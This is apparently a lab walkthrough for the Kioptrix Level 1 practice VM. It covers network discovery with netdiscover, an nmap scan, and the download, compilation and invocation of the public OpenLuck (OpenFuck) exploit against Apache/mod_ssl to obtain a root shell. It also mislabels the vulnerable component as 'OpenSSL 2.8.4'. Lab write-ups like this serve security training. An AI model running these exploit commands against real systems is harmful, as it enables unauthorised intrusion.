# Kiotrix Level 1
### Setup:
1. Download the Kioptrix VM from [Kioptrix level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/).
2. Use RAR to extract the compressed file.
3. Launch VMware player and select the "Kioptrix level 1.vmx" file.(since Kipotrix uses DHCP, I used Bridged Networking)
4. Create a Kioptrix_1 directory within root's home directory, on the system.
### Information Gathering:
1. We will scan our network, so in terminal type netdiscover(is a ARP scanner).
-----netdiscover image--------
2. So the ip of --ip-- will be our Kioptrix machine. We will check for open ports and running services on the VM.
For that Type "nmap -sS -A -n --ip--"
-----nmap image--------
We can see that we have TCP/22 Open(SSH), TCP/80 Open(HTTP) which is running in Apache version 1.3.20 and Apache is also running OpenSSL 2.8.4.
3. In researching OpenSSL 2.8.4, we came across the OpenSSL [OpenF**K](https://github.com/heltonWernik/OpenLuck) exploit.
### Exploit
1. Let's Download the exploit to your kali machine.
2. Install ssl-dev library
   "apt-get install libssl-dev". 
3. Compile 
   "gcc -o OpenFuck OpenFuck.c -lcrypto"
4. Running the Exploit 
   "./OpenFuck"
   ./OpenFuck 0x6b [Target Ip] [port] -c 40
5. Damn you got a Root Shell.
### Closing:
From this VM we learned about basics in tool usage and exploitation.

## Thanks For Reading!